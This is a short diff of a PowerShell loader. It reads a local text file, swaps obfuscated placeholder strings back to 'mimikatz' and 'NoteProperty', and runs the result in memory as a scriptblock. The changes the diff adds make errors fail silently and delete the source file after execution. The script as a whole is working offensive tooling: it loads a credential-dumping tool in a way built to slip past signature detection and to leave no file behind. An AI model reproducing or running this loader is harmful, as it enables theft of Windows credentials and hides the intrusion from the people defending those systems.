@@ -1,12 +1,14 @@
-# OFFLINE, LOCAL CODE FILE NEEDED, DELETE SOURCE CODE AFTER USE
+# OFFLINE, LOCAL CODE FILE NEEDED, CODE FILE SELF-DELETE
 # Manually loads code into memory, compatible with older systems/ps3
-# Copy/paste into ps to load code, invoke after code loaded
+# Copy/paste into ps to load code
 # Invoke-Clist
 
 # Modify file path as needed
 $strCPath = (get-location).path + "\clist.txt"
-$strCode = [io.file]::ReadAllText($strCPath)
+try{$strCode = [io.file]::ReadAllText($strCPath)} catch{} finally{}
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
 $strCode = [scriptblock]::Create($strCode)
 .$strCode
+
+try{rm $strCPath} catch{} finally{}
